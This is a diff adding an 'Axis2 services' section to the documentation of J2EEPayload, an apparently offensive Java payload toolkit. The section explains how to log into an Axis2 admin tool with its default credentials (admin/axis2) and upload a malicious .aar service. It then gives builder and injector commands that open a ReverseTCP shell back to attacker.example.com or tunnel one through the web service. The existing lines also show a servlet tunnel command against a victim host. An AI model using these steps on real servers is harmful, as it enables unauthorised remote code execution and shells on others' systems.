@@ -60,6 +60,7 @@ stager.</p>
 <li>Updated JavaPayload to version 0.3-rc1</li>
 <li>WarBuilder, EarBuilder: Support stripping debug info from classes.</li>
 <li>EarBuilder: Support giving a custom output filename, like WarBuilder already did.</li>
+<li>Add AarBuilder and Axis2 injector/tunnel.</li>
 </ul>
 
 <h2>System requirements</h2>
@@ -251,6 +252,52 @@ work.</p>
 <p><tt>java javapayload.handler.stager.StagerHandler ServletCamouflageTunnel http://victim.example.com/Example4c 1000 -- JSh</tt></p>
 <p>&mdash; or, to use your own parameters &mdash;</p>
 <p><tt>java javapayload.handler.stager.StagerHandler ServletCamouflageTunnel :http://victim.example.com/Example4c/jpc?count=#C#&amp;x=1#POST#foo=bar&amp;JP=#DATA#&fun=#R99# 1000 -- JSh</tt></p>
+
+<h2>Axis2 services</h2>
+
+<p>When using the Eclipse wizard to create an Axis2 service from a WSDL, 
+I was surprised that the resulting WAR file by default includes an Axis2 
+admin tool that can be used to update and add services after deployment
+just via HTTP. It can be found by replacing the <tt>/services/Name</tt>
+in the URL by <tt>/)axis2-admin</tt>. The default credentials for this
+tool are username "<tt>admin</tt>" and password "<tt>axis2</tt>"</p>
+
+<p>The uploaded services have to be in <tt>.aar</tt> format. This format
+can be created by the <tt>AarBuilder</tt></p>
+
+<p>In the following examples I assume that you have <tt>J2EEPayload.jar</tt>,
+<tt>JavaPayload.jar</tt> and <tt>jTCPfwd.jar</tt> in your classpath.</p>
+			
+<h3>Launching "normal" stagers</h3>
+
+<p>The <tt>PayloadService</tt> webservice can be used to interactively
+launch stages on the servlet server. For this, the <tt>aar</tt> has to
+include the stagers you want to use. If you want to call the service
+manually, it has an <tt>execute</tt> method that expects the payload
+command line as an argument, and will return success on success and
+an exception on failure. But you can also use the <tt>AxisInjector</tt>
+for starting the payload, as shown below.</p>
+
+<p><b>On the "attacker" machine:</b></p>
+<p><tt>java javapayload.builder.Builder Aar Example1.aar BindTCP
+ReverseTCP</tt></p>
+<p>deploy Example1.aar to the victim machine via axis2-admin.</p>
+<p><tt>java javapayload.builder.Injector Axis 
+http://victim.example.com/VulnerableWebapp/services/Example1.Example1HttpSoap11Endpoint/
+ReverseTCP attacker.example.com 2012 -- JSh</tt></p>
+			
+<h3>Using the AxisTunnel stager</h3>
+
+<p>The <tt>TunnelService</tt> webservice can be used to tunnel data through
+the Axis web service, by using a polling technique similar to the one used
+by the ServletTunnel stager.</p>
+
+<p><b>On the "attacker" machine</b></p>
+<p><tt>java javapayload.builder.Builder Aar Example2.aar AxisTunnel</tt></p>
+<p>deploy Example2.aar to the victim machine via axis2-admin.</p>
+<p><tt>java javapayload.builder.Injector Axis 
+http://victim.example.com/VulnerableWebapp/services/Example2.Example2HttpSoap11Endpoint/
+AxisTunnel 10000 -- JSh</tt></p>
 
 <h2>Enterprise Java Beans (EJBs)</h2>
 
